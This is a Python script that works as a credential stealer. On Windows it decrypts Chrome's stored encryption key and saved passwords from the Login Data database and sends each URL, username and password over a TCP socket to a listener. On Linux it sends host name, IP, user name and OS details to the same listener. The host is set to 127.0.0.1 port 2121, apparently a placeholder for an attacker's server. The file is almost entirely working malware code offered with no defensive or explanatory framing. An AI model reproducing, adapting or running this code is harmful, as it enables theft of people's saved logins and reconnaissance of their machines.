import platform
import socket 
import getpass
import time
import os
os.system('')
import json 
from base64 import b64decode 
import win32crypt 
import sqlite3 
import shutil 
import crypto.Cipher.AES as cr

def DataExecuter(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, int(port)))
    
    
    a = getpass.getuser()
    f = open(f"C:\\Users\\{a}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", 'r').readline()
    LOCAL_STATE  = dict(json.loads(f))

    key = (LOCAL_STATE['os_crypt']['encrypted_key'])

    key = b64decode(key)
    key = key[5:]

    key = win32crypt.CryptUnprotectData(key)[1]

    path = f"C:\\Users\\{a}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

    shutil.copy(f"C:\\Users\\{a}\\AppData\\Local\Google\\Chrome\\User Data\\Default\\Login Data", f"C:\\Users\\{a}\\AppData\\Local\Google\\Chrome\\User Data\\Default\\databases")

    database = sqlite3.connect(f"C:\\Users\\{a}\\AppData\\Local\Google\\Chrome\\User Data\\Default\\databases\\Login Data")
    cursor = database.cursor()

    cursor.execute("select origin_url , username_value , password_value from logins")

    result = cursor.fetchall()

    def decrypt(password , key): 
        iv = password[3:15]
        password = password[15:]

        cipher = cr.new(key , cr.MODE_GCM , iv) 
        password = cipher.decrypt(password)
        password = password[:-16].decode()
        return password

    for i in result: 
        url = i[0]
        username = i[1]
        password = decrypt(i[2] , key)
        print("{} : ".format(url))
        print("\tusername : {}".format(username))
        print("\tpassword : {}".format(password))
        print()

        pu = f"web : {url}\n +username+ : {username}\n password : {password}\n "

        def printOnConsole(data : str):
            client.send(data.encode('ascii'))
            
        printOnConsole(pu)

class sysInfos:
    hosts = socket.gethostname()

    dataSYS = platform.uname()
    sysOS = dataSYS[0]
    sysNODE = dataSYS[1]
    sysRELEASE = dataSYS[2]
    sysVERSION = dataSYS[3]
    sysMACHINE = dataSYS[4]
    sysIP = socket.gethostbyname(hosts)
    sysName = getpass.getuser()

ip = "127.0.0.1"
port = 2121



if (platform.system() == "Windows"):
    DataExecuter(host=ip, port=port)

elif (platform.system() == "Linux"):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    
    timeOfData = time.strftime("%H:%M:%S")
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mdata\033[97m]::\033[93m{sysInfos.hosts}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mos\033[97m]::\033[93m{sysInfos.sysOS}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mip\033[97m]::\033[93m{sysInfos.sysIP}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mmachine\033[97m]::\033[93m{sysInfos.sysMACHINE}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mname\033[97m]::\033[93m{sysInfos.sysName}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mnode\033[97m]::\033[93m{sysInfos.sysNODE}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mrelease\033[97m]::\033[93m{sysInfos.sysRELEASE}\033[97m\n'.encode('ascii'))
    client.send(f'\033[97m[\033[96m{timeOfData}\033[97m] [\033[92mversion\033[97m]::\033[93m{sysInfos.sysVERSION}\033[97m\n'.encode('ascii'))